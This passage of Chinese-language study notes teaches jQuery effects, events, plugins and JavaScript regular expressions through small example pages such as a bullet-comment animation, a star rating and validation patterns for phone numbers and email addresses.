    $(".des").clone(true).appendTo("div");
  });
</script>
```
>[success] # 弹幕效果
```
1.利用动画实现
2.动画回调函数删除创建的创建的弹幕标签
3.获取屏幕宽度
```
![](https://box.kancloud.cn/ea74d76dec489022aa86b13b278008cd_669x167.png)

>[danger] #### 代码
* html
```
    <style>
        html, body {
            margin: 0px;
            padding: 0px;
            width: 100%;
            height: 100%;
            font-family: "微软雅黑";
            font-size: 62.5%;
        }
        .boxDom {
            width: 100%;
            height: 100%;
            position: relative;
            overflow: hidden;
        }
        .idDom {
            width: 100%;
            height: 100px;
            background: #666;
            position: fixed;
            bottom: 0px;
        }
        .content {
            display: inline-block;
            width: 430px;
            height: 40px;
            position: absolute;
            left: 0px;
            right: 0px;
            top: 0px;
            bottom: 0px;
            margin: auto;
        }
        .title {
            display: inline;
            font-size: 4em;
            vertical-align: bottom;
            color: #fff;
        }

        .text {
            border: none;
            width: 300px;
            height: 30px;
            border-radius: 5px;
            font-size: 2.4em;
        }

        .btn {
            width: 60px;
            height: 30px;
            background: #f90000;
            border: none;
            color: #fff;
            font-size: 2.4em;
        }

        span {
            width: 300px;
            height: 40px;
            position: absolute;
            overflow: hidden;
            color: #000;
            font-size: 4em;
            line-height: 1.5em;
            cursor: pointer;
            white-space: nowrap;
        }

    </style>
</head>
<body>
<div class="boxDom" id="boxDom">
    <div class="idDom" id="idDom">
        <div class="content">
            <p class="title">吐槽:</p>
            <input type="text" class="text" id="text"/>
            <button type="button" class="btn" id="btn">发射</button>
        </div>
    </div>
</div>

```
* jq
```
<script src="jquery-1.12.4.js"></script>

<script>
    $(function () {
        var colors = ["red", "green", "hotpink", "pink", "cyan", "yellowgreen", "purple", "deepskyblue"];
        // 字体随机颜色
        var randomColor = parseInt(Math.random() * colors.length);
        var randomY = parseInt(Math.random() * 400);

        // 不足点没有做输入空的判断
        $("#btn").click(function () {
            var srceenWidth =  document.documentElement.clientWidth || document.body.clientWidth;
            $("<span></span>").text($('#text').val()).css({'color':colors[randomColor],'left':srceenWidth,"top": randomY})
                .animate({left:-500},10000,"linear",function(){$(this).remove()}).appendTo("#boxDom");
            $("#text").val("");
        });

        $("#text").keyup(function (e) {
            if (e.keyCode == 13) {
                $("#btn").click();
            }
        });
    });
</script>
```
>[success] # 获取文本值和焦点
```
1.input/teatext 等使用val(),括号里面填值是赋值，不填是获取值
2.focus --- 获取焦点
3.blur --- 失去焦点
```
>[danger] ##### 文本框案例
![](https://box.kancloud.cn/dfda2d8194ca4d5cff1a59fcd00d3c1e_247x39.png)
```
<input type="button" value="哈哈" id="btn">
<input type="text" value="洋酒" id="txt">

</body>
<script src="jquery-1.12.4.js"></script>
<script>
    $(function(){
        $("#txt").focus(function () {
            if($(this).val() === "洋酒"){
                $(this).val("")
            }
        })

        $('#txt').blur(function () {
            if($(this).val() === ""){
                $(this).val("洋酒");
            }
        })
    })
</script>
```
>[success] # jq -- text/html
```
1.txt() 获取标签中文本信息,括号中填值就是给为本信息赋值
2.html() 获取标签信息和文本信息,括号中填值就是生成一个html标签
```
>[danger] ##### 案例
```

<div><h3>我是标题</h3></div>

</body>
<script src="jquery-1.12.4.js"></script>
<script>
    $(function(){
        console.log($('div').html()) // <h3>我是标题</h3>
        console.log($('div').text()) // 我是标题
        $('div').html("<p>html新增的p标签</p>")
        $('div').text("<p>text新增的p标签</p>")
    })
</script>
```
>[success] # 获取标签的宽高
```
1.  通过css 属性获取 --- $('div').css('height')
2.  通过 width() 括号中没东西获取值，填上就是赋值
3.  通过 height() 括号中没东西获取值，填上就是赋值
4.  innerWidth());//padding+width
5.  outerWidth());//padding+width+border
6.  outerWidth(true));//padding+width+border+margin
```
>[danger] ##### 使用案例和获取浏览器宽度
```
    <style>
        div {
            width: 200px;
            height: 200px;
            background-color: red;
            padding: 10px;
            border: 10px solid #000;
            margin: 10px;
        }
    </style>
</head>
<body>

<div></div>

</body>
<script src="jquery-1.12.4.js"></script>
<script>
    $(function(){
         // 通过css 获取 标签的宽高
        console.log($('div').css('height'))

        // 利用自带的属性获取宽高
        console.log($('div').height())
        console.log($('div').width())
        //console.log($("div").innerWidth());//padding+width
        //console.log($("div").outerWidth());//padding+width+border
        //console.log($("div").outerWidth(true));//padding+width+border+margin



        // 当调整浏览器窗口的大小时，发生 resize 事件。
        $(window).resize(
           function () {
               console.log($(window).width())
               console.log($(window).height())
           }
        )

    })
</script>
```
>[success] # 页面滚轮scrollTop/scrollLeft
```
1.页面向上滚出去的距离 scrollTop
2.页面向左滚出去的距离 scrollLeft
```
>[danger] ##### 案例
```
  <style>
    body {
      height: 4000px;
      width: 4000px;
    }
  </style>
</head>
<body>

<script src="jquery-1.12.4.js"></script>
<script>
  $(function () {
    
    $(window).scroll(function () {
      console.log($(window).scrollTop());
      console.log($(window).scrollLeft());
    });
    
  });
</script>
```
>[success] # 固定导航栏
```
1.到一定程度要固定导航
2.然后一定程度一定也要清除导航
3.scroll() 滚轮滚动事件
```
>[danger] ##### 案例
```
    <style>
        * {
            margin: 0;
            padding: 0
        }
        img {
            vertical-align: top;
        }
        .main {
            margin: 10px auto 0;
            width: 1000px;
        }

        .fixed {
            position: fixed;
            top: 0;
            left: 0;
        }
    </style>
</head>
<body>
<div class="top" id="topPart">
    <img src="images/top.png" alt=""/>
</div>
<div class="nav" id="navBar">
    <img src="images/nav.png" alt=""/>
</div>
<div class="main" id="mainPart">
    <img src="images/main.png" alt=""/>
</div>
<script src="../jquery-1.12.4.js"></script>
<script>
    $(function () {
        $(window).scroll(function () {
            if($(window).scrollTop() >= $('#topPart').height()){
                $('#navBar').addClass('fixed')
                $(".main").css("marginTop", $(".nav").height() + 10);

            }else {
                $(".nav").removeClass("fixed");
                $(".main").css("marginTop", 10);
            }
        })
    })
</script>
```
>[success] # 点击火箭返回顶部
```
1.动画效果一定要stop
```
![](https://box.kancloud.cn/3ce45b4180e7d9d318356d82906fd6ab_168x210.png)
* html
```
    <style>
        body {
            height: 8000px;
        }

        a {
            color: #FFF;
        }
        .actGotop {
            position: fixed;
            bottom: 50px;
            right: 50px;
            width: 150px;
            height: 195px;
            display: none;
            z-index: 100;
        }
        .actGotop a, .actGotop a:link {
            width: 150px;
            height: 195px;
            display: inline-block;
            background: url(images/gotop.png) no-repeat;
            outline: none;
        }

        .actGotop a:hover {
            width: 150px;
            height: 195px;
            background: url(images/gotop.gif) no-repeat;
            outline: none;
        }
    </style>
</head>
<body>
<!-- 返回顶部小火箭 -->
<div class="actGotop"><a href="javascript:;" title="Top"></a></div>
```

* jq
```
<script src="jquery-1.12.4.js"></script>
<script>
    $(function () {
        //当页面超出去1000px的时候，让小火箭显示出来,如果小于1000，就让小火箭隐藏
        $(window).scroll(function () {
            if($(window).scrollTop() >= 1000 ){
                $(".actGotop").stop().fadeIn(1000);
            }else {
                $(".actGotop").stop().fadeOut(1000);
            }
        });


        //通过自定义的动画让滚轮 动画向上
        $(".actGotop").click(function () {
            $("html,body").stop().animate({scrollTop:0},3000);
            //scrollTop为0
            $(window).scrollTop(0);
        })

    })
</script>
```
>[success] # offset方法与position方法

offset方法获取元素距离document的位置，position方法获取的是元素距离有定位的父元素的位置。

```
//获取元素距离document的位置,返回值为对象：{left:100, top:100}
$(selector).offset();
//获取相对于其最近的有定位的父元素的位置。
$(selector).position();
```
>[danger] # 案例
```

  <style>
    * {
      margin: 0;
      padding: 0;
    }
    
    .father {
      width: 400px;
      height: 400px;
      background-color: pink;
      position: relative;
      margin: 100px;
    }
    
    .son {
      width: 200px;
      height: 200px;
      background-color: red;
      position: absolute;
      top: 100px;
      left: 100px;
    }
  </style>
</head>
<body>

<div class="father">
  <div class="son"></div>
</div>

<script src="jquery-1.12.4.js"></script>
<script>
  $(function () {
    
    //获取元素的相对于document的位置
    console.log($(".son").offset());
    
    //获取元素相对于有定位的父元素的位置
    console.log($(".son").position());
    
    
  });
</script>

打印结果：
```
![](https://box.kancloud.cn/b11af05984c4d146d7c15b18911ab86b_165x136.png)

>[success] # on 委托事件   --- 原理事件冒泡
```
1.$(selector).on(events[,selector][,data],handler);
2.第一个参数是事件
3.第二个参数：selector, 执行事件的后代元素（可选），如果没有后代元素，那么事件将有自己执行
4.第三个参数：data，传递给处理函数的数据，事件触发的时候通过event.data来使用（不常使用）
5.第四个参数：handler，事件处理函数
6.如果只填写第一个和第四个参数触发的是，当前jq对象事件
7.如果都填触发的是当前jq对象中所有子类的事件
8.执行顺序 自己的事件--- 父类的事件--- 委托事件
```
|  用法  |   解释 |
| --- | --- |
|  $('#btn').on('click',function (){})  |两个参数就是给什么按钮，绑定了什么事件|    
| $('#first').on('click','p',function () {})   |  三个参数就是给某个父类的子类绑定了什么事件  |


>[danger] ##### 案例
```
<input type="button" value="增加" id="btn">
<div id="first">
    <p>点击事件</p>
    <div id="second">
        <p>点击事件二</p>
    </div>
</div>
</body>
<script src="jquery-1.12.4.js"></script>
<script>
    $(function(){
        // 给按钮自己绑定事件
         $('#btn').on('click',function () {
             $('#second').append("<p>后添加的</p>")
         })

        // 给first儿子孙子下面的标签绑定事件
        $('#first').on('click','p',function () {
            console.log("1")
        })
    })
</script>
``` 
>[success] # on 委托事件table 案例
```
1.孙子委托的那种，this表示的是当前，孙子
2.empty() 清除肚子里面的东西
3.remove() 从自己开始都清除
```
![](https://box.kancloud.cn/ddf3efd740e3a66e6457579c94483961_282x248.png)

>[danger] ##### html
```
    <style>

        * {
            padding: 0;
            margin: 0;
        }

        .wrap {
            width: 410px;
            margin: 100px auto 0;
        }

        table {
            border-collapse: collapse;
            border-spacing: 0;
            border: 1px solid #c0c0c0;
        }

        th,
        td {
            border: 1px solid #d0d0d0;
            color: #404060;
            padding: 10px;
        }

        th {
            background-color: #09c;
            font: bold 16px "Î¢ÈíÑÅºÚ";
            color: #fff;
        }

        td {
            font: 14px "Î¢ÈíÑÅºÚ";
        }

        td a.get {
            text-decoration: none;
        }

        a.del:hover {
            text-decoration: underline;
        }

        tbody tr {
            background-color: #f0f0f0;
        }

        tbody tr:hover {
            cursor: pointer;
            background-color: #fafafa;
        }

        .btnAdd {
            width: 110px;
            height: 30px;
            font-size: 20px;
            font-weight: bold;
        }

        .form-item {
            height: 100%;
            position: relative;
            padding-left: 100px;
            padding-right: 20px;
            margin-bottom: 34px;
            line-height: 36px;
        }

        .form-item > .lb {
            position: absolute;
            left: 0;
            top: 0;
            display: block;
            width: 100px;
            text-align: right;
        }

        .form-item > .txt {
            width: 300px;
            height: 32px;
        }

        .mask {
            position: absolute;
            top: 0px;
            left: 0px;
            width: 100%;
            height: 100%;
            background: #000;
            opacity: 0.15;
            display: none;
        }

        .form-add {
            position: fixed;
            top: 30%;
            left: 50%;
            margin-left: -197px;
            padding-bottom: 20px;
            background: #fff;
            display: none;
        }

        .form-add-title {
            background-color: #f7f7f7;
            border-width: 1px 1px 0 1px;
            border-bottom: 0;
            margin-bottom: 15px;
            position: relative;
        }

        .form-add-title span {
            width: auto;
            height: 18px;
            font-size: 16px;
            font-family: ËÎÌå;
            font-weight: bold;
            color: rgb(102, 102, 102);
            text-indent: 12px;
            padding: 8px 0px 10px;
            margin-right: 10px;
            display: block;
            overflow: hidden;
            text-align: left;
        }

        .form-add-title div {
            width: 16px;
            height: 20px;
            position: absolute;
            right: 10px;
            top: 6px;
            font-size: 30px;
            line-height: 16px;
            cursor: pointer;
        }

        .form-submit {
            text-align: center;
        }

        .form-submit input {
            width: 170px;
            height: 32px;
        }
    </style>

</head>
<body>
<div class="wrap">
    <input type="button" value="清空内容" id="btn">
    <input type="button" value="添加" id="btnAdd">
    <table>
        <thead>
        <tr>
            <th>课程名称</th>
            <th>工作</th>
            <th>操作</th>
        </tr>
        </thead>
        <tbody id="j_tb">
        <tr>
            <!-- <td><input type="checkbox"/></td> -->
            <td>JavaScript</td>
            <td>测试</td>
            <td><a href="javascrip:;" class="get">DELETE</a></td>
        </tr>
        <tr>
            <!-- <td><input type="checkbox"/></td> -->
            <td>css</td>
            <td>测试</td>
            <td><a href="javascrip:;" class="get">DELETE</a></td>
        </tr>
        <tr>
            <!-- <td><input type="checkbox"/></td> -->
            <td>html</td>
            <td>测试</td>
            <td><a href="javascrip:;" class="get">DELETE</a></td>
        </tr>
        <tr>
            <td>jQuery</td>
            <td>测试</td>
            <td><a href="javascrip:;" class="get">DELETE</a></td>
        </tr>
        </tbody>
    </table>
</div>
```
>[danger] ##### js
```
<script src="jquery-1.12.4.js"></script>
<script>
    $(function(){
        // 清除所有内容用empty（）
        //1. 找到清空按钮，注册点击事件，清空tbody
        $("#btn").on("click", function () {
            $("#j_tb").empty();
        });
        
        // 增加委托事件
        $('#j_tb').on('click','.get',function () {
            // 这个this 表示的是当前 .get 的this
            $(this).parent().parent().remove()
        })


        //3. 找到添加按钮,注册点击事件
        $("#btnAdd").on("click", function () {
            $('<tr> <td>jQuery111</td> <td>11111</td> <td><a href="javascrip:;" class="get">DELETE</a></td> </tr>').appendTo("#j_tb");
        });

    
    })
</script>
```
>[success] # 移除事件
```
// 解绑匹配元素的所有事件
$(selector).off();
// 解绑匹配元素的所有click事件
$(selector).off("click");
```
>[success] # 触发事件
```
$(selector).click(); //触发 click事件
$(selector).trigger("click");
```
>[success] # 触发事件
```
//screenX和screenY    对应屏幕最左上角的值
//clientX和clientY    距离页面左上角的位置（忽视滚动条）
//pageX和pageY    距离页面最顶部的左上角的位置（会计算滚动条的距离）

//event.keyCode    按下的键盘代码
//event.data    存储绑定事件时传递的附加数据

//event.stopPropagation()    阻止事件冒泡行为
//event.preventDefault()    阻止浏览器默认行为
//return false:既能阻止事件冒泡，又能阻止浏览器默认行为。
```
>[danger] ##### 获取传入的值
```
var money = 100;
    //on(types, selector, data, callback)
    //使用on方法的时候，可以给data参数传一个值，可以在事件里面通过e.data获取到。
    $("div").on("click",money, function (e) {
      console.log(e);
      console.log("哈哈，我有"+e.data);
    });
```
>[success] # 标题钢琴
```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Title</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      list-style: none;
    }
    
    .nav {
      width: 900px;
      height: 60px;
      background-color: black;
      margin: 0 auto;
    }
    
    .nav li {
      width: 100px;
      height: 60px;
      /*border: 1px solid yellow;*/
      float: left;
      position: relative;
      overflow: hidden;
    }
    
    .nav a {
      position: absolute;
      width: 100%;
      height: 100%;
      font-size: 24px;
      color: blue;
      text-align: center;
      line-height: 60px;
      text-decoration: none;
      z-index: 2;
    }
    
    .nav span {
      position: absolute;
      width: 100%;
      height: 100%;
      background-color: yellow;
      top: 60px;
    }
  </style>
  <script src="../jquery-1.12.4.js"></script>
  <script>
    $(function () {
      //给li注册鼠标进入事件,让li下面的span top：0  播放音乐
      $(".nav li").mouseenter(function () {
        $(this).children("span").stop().animate({top: 0});
        //播放音乐
        var idx = $(this).index();
        $(".nav audio").get(idx).load();
        $(".nav audio").get(idx).play();
      }).mouseleave(function () {
        $(this).children("span").stop().animate({top: 60});
      });
      
      //节流阀  ：按下的时候，触发，如果没弹起，不让触发下一次
      //1. 定义一个flag
      var flag = true;
      
      
      //按下1-9这几个数字键，能触发对应的mouseenter事件
      $(document).on("keydown", function (e) {
        if(flag) {
          flag = false;
          //获取到按下的键
          var code = e.keyCode;
          if(code >= 49 && code <= 57){
            //触发对应的li的mouseenter事件
            $(".nav li").eq(code - 49).mouseenter();
          }
        }
       
      });
  
      $(document).on("keyup", function (e) {
        flag = true;
        
        //获取到按下的键
        var code = e.keyCode;
        if(code >= 49 && code <= 57){
          //触发对应的li的mouseenter事件
          $(".nav li").eq(code - 49).mouseleave();
        }
      });
      
      
      //弹起的时候，触发mouseleave事件
      
    });
  </script>
</head>
<body>
<div class="nav">
  <ul>
    <li>
      <a href="javascript:void(0);">导航1</a>
      <span></span>
    </li>
    <li><a href="javascript:void(0);">导航2</a><span></span></li>
    <li><a href="javascript:void(0);">导航3</a><span></span></li>
    <li><a href="javascript:void(0);">导航4</a><span></span></li>
    <li><a href="javascript:void(0);">导航5</a><span></span></li>
    <li><a href="javascript:void(0);">导航6</a><span></span></li>
    <li><a href="javascript:void(0);">导航7</a><span></span></li>
    <li><a href="javascript:void(0);">导航8</a><span></span></li>
    <li><a href="javascript:void(0);">导航9</a><span></span></li>
  </ul>
  
  <div>
    <audio src="mp3/1.ogg"></audio>
    <audio src="mp3/2.ogg"></audio>
    <audio src="mp3/3.ogg"></audio>
    <audio src="mp3/4.ogg"></audio>
    <audio src="mp3/5.ogg"></audio>
    <audio src="mp3/6.ogg"></audio>
    <audio src="mp3/7.ogg"></audio>
    <audio src="mp3/8.ogg"></audio>
    <audio src="mp3/9.ogg"></audio>
  </div>
</div>
</body>
</html>
```
>[success] # 显示在隐藏
```
1.delay --- 动画延迟
```
>[danger] ##### 提示信息显示
```
       <!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <title>Title</title>
  <style>
    div {
      width: 400px;
      height: 60px;
      background-color: pink;
      text-align: center;
      line-height: 60px;
      font-size: 30px;
      margin: 100px auto;
      display: none;
      
    }
  </style>
</head>
<body>
<div>这个一个提示消息</div>


<script src="jquery-1.12.4.js"></script>
<script>
  $(function () {
    
    $("div").fadeIn(1000).delay(2000).fadeOut(1000);
    
  });
</script>
</body>
</html>
```
>[success] # 五星好评
```
1.prevAll() 选中的星星和选中之前的星星都变成实心
2.nextAll() 往后的都变成空心
3.离开后ul 下面他的儿子都变成空心
4.把又 current class 的前面和他自己变成实心
5.给点击的设置实心样式，其他的都清空样式
```
>[danger] ##### 代码
```
    <style>
        * {
            padding: 0;
            margin: 0;
        }

        .comment {
            font-size: 40px;
            color: #ff16cf;
        }

        .comment li {
            float: left;
        }

        ul {
            list-style: none;
        }
    </style>
</head>
<ul class="comment">
    <li>☆</li>
    <li>☆</li>
    <li>☆</li>
    <li>☆</li>
    <li>☆</li>
</ul>
</body>
<script src="jquery-1.12.4.js"></script>
<script>
    $(function(){
        var wjx_k = "☆";
        var wjx_s = "★";
        $(".comment>li").on("mouseenter", function () {
            // 被选中的往前所有的变成实心，
            $(this).text(wjx_s).prevAll().text(wjx_s);
            // 往后变成空心
            $(this).nextAll().text(wjx_k);
        });

        //离开后为点击，星星清空
        $(".comment").on("mouseleave", function () {
            $(this).children().text(wjx_k);
            //再做一件事件，找到current，让current和current前面的变成实心就行。
            $("li.current").text(wjx_s).prevAll().text(wjx_s);
        });
        });

        //3. 给li注册点击事件
        $(".comment>li").on("click", function () {
            $(this).addClass("current").siblings().removeClass("current");
        });
    })
</script>
```
>[danger] ##### each 循环
```
// 参数一表示当前元素在所有匹配元素中的索引号
// 参数二表示当前元素（DOM对象）
$(selector).each(function(index,element){});
1.forEach 是 js 循环数组的方法不兼容IE8等低版本浏览器，是EcmaScript提供的
2.each 是jquery 对象也可以循环数组
3.each 也可以循环对象也就是字典
4.也可以循环jq 对象
```
>[danger] ##### 案例
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
</head>
<body>
<div></div>
<div></div>
<div></div>
<div></div>
<div></div>
<script src="/testNodes/node_modules/jquery/dist/jquery.js"></script>
<script>
    //forEach 是 js 循环数组的方法不兼容IE8等低版本浏览器，是EcmaScript提供的
    ;["a", "b"].forEach(function (item,index) {
        console.log(item)
    })

    // each 是jquery 对象也可以循环数组
    $.each(['a','b'],function (index, item) {
        console.log(item)
    })
    // each 也可以循环对象也就是字典
    $.each({a:'b'},function (index, item) {
        console.log(index,item)
    })
    //也可以循环jq 对象循环对象只能这么用
    $('div').each(function (index,item) {
        console.log(index,item)
    })
    
</script>
</body>
</html>
```
打印结果：
![](https://box.kancloud.cn/8f616a593af7d6b5046e6cad81f1d5e8_191x196.png)
>[success] # 更改 jq
```
1.jQuery使用$作为标示符，但是如果与其他框架中的$冲突时，jQuery可以释放$符的控制权.
var c = $.noConflict();//释放$的控制权,并且把$的能力给了c
```
>[success] # 图片懒加载
```
jQueryUI专指由jQuery官方维护的UI方向的插件。

官方API：http://api.jqueryui.com/category/all/

其他教程：jQueryUI教程

基本使用:

1.    引入jQueryUI的样式文件
2.    引入jQuery
3.    引入jQueryUI的js文件
4.    使用jQueryUI功能
```

>[danger] ##### 案例
```
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <title>Title</title>
  <style>
    div {
      height: 4000px;
    }
  </style>
</head>
<body>
<div></div>
<img class="lazy" data-original="02.gif" alt="">

<script src="jquery-1.12.4.js" type="text/javascript"></script>
<script src="jquery.lazyload.js" type="text/javascript"></script>
<script>
  
  $(function () {
  
    $("img.lazy").lazyload();
  
  });
  
</script>
</body>
</html>

```

>[success] # 颜色渐变效果
```
jquery.color.js
animate不支持颜色的渐变，但是使用了jquery.color.js后，就可以支持颜色的渐变了。

使用插件的步骤

1. 引入jQuery文件
2. 引入插件（如果有用到css的话，需要引入css）
3. 使用插件
```
>[danger] ##### 案例
```
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <title>Title</title>
  <style>
    div {
      width: 400px;
      height: 400px;
      background-color: red;
    }
  </style>
</head>
<body>

<div></div>

<!--1. 引入jquery的js文件-->
<script src="jquery-1.12.4.js"></script>
<!--2. 引入插件的js文件-->
<script src="jquery.color.js"></script>
<script>
  $(function () {
  
    //3. 直接使用即可。
    //说明jquery不支持颜色的渐变,颜色最好用16进制
    $('div').animate({backgroundColor:"#ffc0cb"}, 3000, function () {
        alert("呵呵");
    });
  
  });
</script>
</body>
</html>
```

>[success] # 自定义插件

```
//通过给$.fn添加方法就能够扩展jquery对象
$.fn. pluginName = function() {};
```
>[danger] ##### 案例
```
$.fn.accordion = function (colors, width) {
  colors = colors || [];
  width = width || 0;


  var $li = this.find("li");

  var boxLength = this.width();
  var maxLength = boxLength - ($li.length - 1) * width;
  var avgLength = boxLength / $li.length;

  //更改li的颜色
  $li.each(function (i, e) {
    $(e).css("backgroundColor", colors[i]);
  });

  //给li注册鼠标经过事件
  $li.on("mouseenter", function () {
    $(this).stop().animate({width: maxLength}).siblings().stop().animate({width: width})
  });

  $li.on("mouseleave", function () {
    $li.stop().animate({width: avgLength});
  });
};
```
```
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <title>Title</title>
  <style>

    * {
      margin: 0;
      padding: 0;
      list-style: none;
    }

    div {
      width: 1000px;
      height: 300px;
      border: 2px solid #000;
      margin: 100px auto;
      overflow: hidden;
    }

    ul {
      width: 1100px;
    }

    li {
      width: 100px;
      height: 300px;
      float: left;
    }

  </style>
</head>
<body>

<div id="box">

  <ul>
    <li></li>
    <li></li>
    <li></li>
    <li></li>
    <li></li>
    <li></li>
    <li></li>
    <li></li>
    <li></li>
    <li></li>
  </ul>

</div>

<script src="jquery-1.12.4.js"></script>
<script src="jquery.accordion.js"></script>
<script>

  $(function () {
    var colors = ["red","yellow","green", "cyan", "pink","hotpink", "blue", "yellowgreen","greenyellow", "skyblue"];

    $("#box").accordion();

  });


</script>

</body>
</html>
```
[TOC]
>[success] # 正则表达式
```
1.正则表达式，又称规则表达式。（英语：Regular Expression，在代码中常简写为regex、regexp或RE），
 正则表达式通常被用来检索、替换那些符合某个模式(规则)的文本。
2.用来匹配字符串
3.正则表达式的组成:是由元字符或者是限定符组成的一个式子
```
>[danger] ##### 常用的元字符
```
1. .   --- 点表示除了\n 以外的任意一个字符

2. []  --- 表示范围，
   [0-9]表示0-9之间任意一个数字
   [a-z]表示a-z 所有任意小写字母中的一个
   [A-Z] 表示的是:所有的大写的字母中的任意的一个
   [a-zA-Z] 表示的是:所有的字母的任意的一个
   [0-9a-zA-Z] 表示的是: 所有的数字或者是字母中的一个
   表示999-100以内 用正则 [1-9][0-9][0-9] 不能写成[100-999]
   
3. []  --- 把正则表达式中元字符的意义干掉 [.]就表示一个点

4. |   --- 或者[0-9]|[a-z] 表示的是要么是一个数字,要么是一个小写的字母

5. ()  --- 分组 提升优先级   [0-9]|([a-z])|[A-Z]  优先a-z，([0-9])([1-5])([a-z]) 三组, 从最左边开始计算
```

>[danger] ##### 元字符中的限定符
```
1. *  ---  表示的是:前面的表达式出现了0次到多次，[a-z][0-9]* 小写字母中的任意一个 后面是要么是没有数字的,要么是多个数字的
2. +  ---  表示的是:前面的表达式出现了1次到多次  [a-z][9]+  小写字母一个后面最少一个9,或者多个9
3. ?  表示的是:前面的表达式出现了0次到1次,最少是0次,最多1次 ,另一个含义:阻止贪婪模式
```
>[danger] ##### 限定符 
```
1.限定符:限定前面的表达式出现的次数
2. {0,} 表示的是前面的表达式出现了0次到多次,和 *一样的
   {1,} 表示的是前面的表达式出现了1次到多次,和 +一样的
   {0,1} 表示的是前面的表达式出现了0次到1次,和 ?一样的
   {5,10} 表示的是前面的表达式出现了5次到10次
   {4} 前面的表达式出现了4次
   {,10} 错误的========不能这么写
```
>[danger] ##### 以什么开头/取反
```
1. 表示的是以什么开始,或者是取非(取反) ^[0-9] 以数字开头
  ^[a-z] 以小写字母开始
   [^a-z] 非小写字母
```
>[danger] ##### 以什么结束
```
1.$ 表示的是以什么结束   [0-9][a-z]$  必须以小写字母结束
```
>[danger] ##### 缩写
```
\d 数字中的任意一个,
\D 非数字中的一个
\s 空白符中的一个
\S 非空白符
\w 非特殊符号
\W 特殊符号
\b 单词的边界
```
[TOC]
>[success] # 正则表达式
```
秘诀：
1.找规律 
2.不要追求完美
3.小括号是同一个表达构成用小括号
```
>[danger] ##### 编写身份证正则表达式
```
1.找规律身份证不能是0开头，有十五位，和18位，其中18位最后一位可能是Xx
```
```
1.([1-9][0-9]{14})|([1-9][0-9]{16}[0-9Xx])

// ？一次到多次，又一次就是18位，没有就是十五位
2.([1-9][0-9]{14})([0-9]{2}[0-9Xx])?
```

>[danger] ##### 编写座机号正则练习
```
1.010-19876754
2.0431-87123490
3.规律三到四位开头 中间有一个横，后面是八位
```
```
1.[0-9]{3,4}[-][0-9]{8}
2.\d{3,4}[-]\d{8}
3.\d{3,4}[-][0-9]{8}
```
>[danger] ##### qq号码
```
1.5-11位数
```
```
1.[1-9][0-9]{4,10}
```
>[danger] ##### 手机号码
```
130 131 132 133 134 135 136 137 138 139
143 147
150 151 152 153 154 155 156 157 158 159
170 171 173 176 177
180 181 182 183 184 185 186 187 188 189
1.其中 13 15 18开头的都是0-9
```
```
([1][358][0-9]{9})|([1][4][37][0-9]{8})|([1][7][01367][0-9]{8})
```

>[danger] ##### 邮箱的正则表达式
```
1.sdsdhl.-sd12@163.com.cn
2.@前面0-9大小写字母点下划线横线，出现一次或者多次
3.@后面也是一样
4.结尾是点加后缀，可能是单个后缀也可能多个后缀
```
```
[0-9a-zA-Z_.-]+[@][0-9a-zA-Z_.-]+([.][a-zA-Z]+){1,2}
```
[TOC]
>[success] # 创建正则表达判断
```
1.通过对象创建
2.字面量的方式创建
```
>[danger] ##### 通过js自带对象  -- RegExp
```
1.创建一个RegExp 对象，加入正则条件
2.用test 方法去匹配字符串
3.RegExp(/\d{5}/)  中 用了      '/ /'来包裹表达式省去了特殊符号转译，类似re，
4.否则RegExp("\\d{5}")给吧双引号中的\转译回来，用双\\
```
```
var re = new RegExp(/\d{5}/)
var str = "我的电话1333333333"
var flag = re.test(str)
console.log(flag)
打印结果：
true
```
>[danger] ##### 字面量的方法转译
```
1.直接用‘/ /’来接受判断
```
```
var re = /\d{1,5}/;
var flag = re.test("Wodedianhau122212")
console.log(flag)
打印结果：
true
```
>[danger] ##### 搜集的一些简单案例
```
console.log(/./.test("除了回车换行以为的任意字符"));//true
console.log(/.*/.test("0个到多个"));//true
console.log(/.+/.test("1个到多个"));//true
console.log(/.?/.test("哈哈"));//true
console.log(/[0-9]/.test("9527"));//true
console.log(/[a-z]/.test("what"));//true
console.log(/[A-Z]/.test("Are"));//true
console.log(/[a-zA-Z]/.test("干啥子"));//false
console.log(/[0-9a-zA-Z]/.test("9ebg"));//true
console.log(/b|(ara)/.test("abra"));//true
console.log(/[a-z]{2,3}/.test("arfsf"));//true
console.log(/\d/.test("998"));//true
console.log(/\d*/.test("998"));//true
console.log(/\d+/.test("998"));//true
console.log(/\d{0,}/.test("998"));//true
console.log(/\d{2,3}/.test("998"));//true
console.log(/\D/.test("eat"));//true
console.log(/\s/.test("  "));//true
console.log(/\S/.test("嘎嘎 "));//true
console.log(/\w/.test("_"));//true
console.log(/\W/.test("_"));//flase
```
>[success] # 正则表达式更多用法
```
1.正则表达式中:g 表示的是全局模式匹配
2.正则表达式中:i 表示的是忽略大小写
```
>[danger] ##### 根据正则获取文本（在字符串的角度）  --- match
```
1.单独只使用匹配只能获取一个   
2.想文字中每一个都匹配用g全局匹配
3.得到的是数组
```
```
var str="中国移动:10086,中国联通:10010,中国电信:10000";
var phones = str.match(/\d{5}/);
var phoneg = str.match(/\d{5}/g);
console.log(phones)
console.log(phoneg)

打印结果：
["10086", index: 5, input: "中国移动:10086,中国联通:10010,中国电信:10000", groups: undefined]
["10086", "10010", "10000"]
```

>[danger] ##### 分组提取文字内容
```
1.用()进行分组
2.用RegExp.$3 读取对应的分组
```
```
var str="2018-08-12";
var strs = str.match(/(\d{4})[-](\d{2})[-](\d{2})/g)
console.log(strs)
console.log(RegExp.$3)

打印结果：
["2018-08-12"]
12
```
>[danger] ##### 去掉字符中的空格
```
1.自带的去空格只能去掉首位
2.利用正则去空格
```
```
// 去空格 去掉首位空格
    var str="  我是    ,你好  ";
    str=str.trim();
    console.log("==="+str+"===");

// 利用 str 的替换 配合正则
var str="  我是    ,你好  ";
str =str.replace(/\s+/g,"")
console.log("==="+str+"===");
   
打印结果：
===我是    ,你好===
===我是,你好===
```
>[danger] ##### 对网址做正则
```
 html = html.replace('"','').replace(/[\\]/g,'');
```

